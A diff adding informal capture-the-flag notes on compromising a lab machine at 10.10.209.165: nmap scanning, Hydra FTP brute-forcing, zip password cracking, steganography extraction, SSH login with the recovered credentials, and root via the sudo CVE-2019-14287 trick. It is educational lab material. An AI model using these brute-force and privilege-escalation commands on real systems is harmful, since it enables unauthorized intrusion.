@@ -1,0 +1,98 @@
+nmap -A -vv -T5  10.10.209.165 -oN nmapresult.txt
+
+Curl(Client URL) :-
+ - Use to transfer data to/from server using range of network protocol including HTTP, HTTPS, and FTP
+ - Make HTTP Request directly from their computer
+ - HTTP Headers are key/value pairs that pass additional data between the client and the server 
+ - Client use HTTP headers to send data such as User-Agent name
+ Tm :- curl "http://10.10.209.165" -H "User-Agent: C" -L
+ AN :- Agent Chris
+
+
+BRuteForce HYdra :-
+ hydra -l chris -P /usr/share/wordlists/rockyou.txt.gz -f ftp://10.10.209.165 -o hydraresult.txt -t 64 -I 
+ AN :- crystal
+ ftp :- open 10.10.209.165 -> chris -> crystal
+ Download file :- mget cute-alien.jpg  cutie.png  To_agentJ.txt
+ MOve file :- mv cute-alien.jpg  cutie.png  To_agentJ.txt ftpresult/
+ 
+ TM :- cat To_agentJ.txt
+ TM :- strings cute-alien.jpg
+ TM :- strings cutie.png 
+  - it shows To_agentR.txt file
+  - to find file inside image that are binary code use binwalk tools
+  
+ 
+ Binwalk :- Searching given binary image for embedded files and executable code 
+  TM :- binwalk -e cutie.png
+  TM :- cd _cutie.png.extracted
+   - files founded :- 365  365.zlib  8702.zip  To_agentR.txt
+  TM :- cat To_agentR.txt | Empty file
+  TM :- unzip 8702.zip    
+  TM :- 7z e 8702.zip  | but it requied password
+   - TO CRack it 
+   - /usr/share/john/zip2john.py 8702.zip > hash_zip_Crack.txt
+   - johntheripper hash_zip_crack.txt --wordlist=/usr/share/wordlist/dirbuster/rockyou.txt
+   - password :- alien
+  
+  TM :- 7z e 8702.zip | Password :- alien
+  cat To_agentR.txt   | COde :- QXJlYTUx
+  TM :- echo QXJlYTUx | base64 -d  
+   - Area51
+   
+  Stegnography :-
+   steghide extract -sf cute-alien.jpg
+   Password :- Area51
+   - it extract message.txt file 
+   - User :- James  
+   - SSH  PAssword :- hackerrules
+  
+  
+  LOgin with SSH :-
+   - ssh james@10.10.209.165 
+   - password :- hackerrules
+   - ls
+   - found 2 file alien_autospy.jpg and user_flag.txt 
+   - cat user_flag.txt
+   - Reverse photo :-
+     scp james@IP:/home/james/imagename .
+   - Put image in google and search incident that :- 
+   - sudo -l # Give us list of any binaries that we are allowed to run using the sudo 
+   - enumerate the sudo version using sudo -v
+   - version vulnerability find in exploit db and flag :- CVE-2019-14287
+   tm :- sudo -u#-1 /bin/bash
+   - we got inside root
+   - ls /root
+   - cat root.txt
+   - DesKel and flag findedd
+   
+ 
+# Linpease :-
+   -   
+        
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+ 	 	 
+ 
+ 
+ 
+ 
